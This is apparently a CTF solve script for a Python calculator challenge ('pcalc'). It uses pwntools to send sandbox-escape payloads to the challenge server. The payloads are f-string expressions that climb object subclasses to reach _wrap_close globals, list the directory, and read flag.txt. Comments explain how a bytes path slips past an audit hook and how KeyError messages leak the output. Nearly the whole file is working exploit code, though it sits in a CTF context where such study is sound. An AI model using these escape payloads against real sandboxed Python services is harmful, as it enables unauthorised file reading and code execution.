from pwn import *

context.log_level = 'info'

def connect():
    return remote('pcalc.ctf.prgy.in', 1337, ssl=True)

# Step 1: List directory to find flag file
p = connect()
p.recvuntil(b'>>> ')

# f-string children aren't validated by AST checker
# {}[key] triggers KeyError, which gets printed in the error handler
# Use _wrap_close from os module (imported in chal.py) to access os.listdir
payload_ls = """f"{ {}[' '.join([c for c in ().__class__.__mro__[-1].__subclasses__() if c.__name__=='_wrap_close'][0].__init__.__globals__['listdir']('.'))] }" """

log.info(f"Sending listdir payload...")
p.sendline(payload_ls.strip().encode())
response = p.recvall(timeout=10)
log.info(f"Listdir: {response.decode()}")
p.close()

# Step 2: Read flag.txt using bytes path to bypass audit hook
# isinstance(b'flag.txt', str) == False â†’ audit check skipped
p = connect()
p.recvuntil(b'>>> ')

payload_flag = """f"{ {}[[c for c in ().__class__.__mro__[-1].__subclasses__() if c.__name__=='_wrap_close'][0].__init__.__globals__['__builtins__']['open'](b'flag.txt').read()] }" """

log.info(f"Sending flag read payload...")
p.sendline(payload_flag.strip().encode())
response = p.recvall(timeout=10)
log.info(f"Flag: {response.decode()}")
p.close()
